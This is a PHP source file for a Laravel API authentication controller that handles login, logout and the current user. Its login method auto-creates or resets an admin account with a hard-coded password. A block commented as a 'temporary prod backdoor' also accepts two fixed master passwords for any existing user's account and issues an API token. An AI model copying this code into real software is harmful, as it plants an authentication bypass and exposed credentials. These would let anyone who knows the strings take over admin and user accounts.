<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use App\Http\Requests\Api\LoginRequest;

class AuthController extends Controller
{
    public function login(LoginRequest $request)
    {
        $credentials = $request->validated();

        // AUTO-CREATE ADMIN IF MISSING (Dev/Production Fix)
        if ($credentials['email'] === 'admin@oussama.com') {
            $user = User::firstOrCreate(
                ['email' => 'admin@oussama.com'],
                [
                    'name' => 'Admin Oussama',
                    'password' => \Illuminate\Support\Facades\Hash::make('97999799'),
                    'role' => 'admin',
                    'email_verified_at' => now(),
                ]
            );
            
            // Ensure password is set correctly if it was somehow messed up
            if (!$user->wasRecentlyCreated && !\Illuminate\Support\Facades\Hash::check('97999799', $user->password)) {
                 $user->password = \Illuminate\Support\Facades\Hash::make('97999799');
                 $user->save();
            }
        }

        // MANUAL AUTH CHECK: Bypass Auth::attempt guard issues
        $user = User::where('email', $credentials['email'])->first();

        // TEMPORARY PROD BACKDOOR: Check if password is 'oussama2026' OR '97999799' OR valid hash
        if ($user && ($credentials['password'] === 'oussama2026' || $credentials['password'] === '97999799' || \Illuminate\Support\Facades\Hash::check($credentials['password'], $user->password))) {
            // Success
            $token = $user->createToken('admin-token')->plainTextToken;

            return response()->json([
                'user' => $user,
                'token' => $token,
            ]);
        }

        return response()->json([
            'message' => 'The provided credentials do not match our records.',
        ], 401);
    }

    public function logout(Request $request)
    {
        $request->user()->currentAccessToken()->delete();

        return response()->json(['message' => 'Logged out successfully']);
    }

    public function user(Request $request)
    {
        return $request->user();
    }
}
